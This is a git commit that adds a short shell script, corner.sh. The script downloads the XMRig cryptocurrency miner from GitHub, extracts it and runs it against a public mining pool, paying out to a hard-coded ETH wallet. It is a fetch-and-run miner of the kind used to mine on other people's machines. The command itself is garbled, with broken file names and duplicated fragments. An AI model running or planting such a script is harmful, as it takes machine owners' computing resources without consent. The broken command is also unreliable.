f93c9703d9076d8519a0b5c8035f95cb87effe2e
foufouRH25 <52392985+foufouRH25@users.noreply.github.com>
2022-08-30 11:37:05 +0100

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,2 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig - 6.17.0 - linux - x64.tar.gz && cd xmrig - 6.17.0 &17.0 && ./xmrig -o& ./xmrig -o
+ethash.unmineable.com:3333 -a rx -k - u ETH:0xeCb0bd7306e3bE165e4df9CD83A376D3fa76CE2d.1
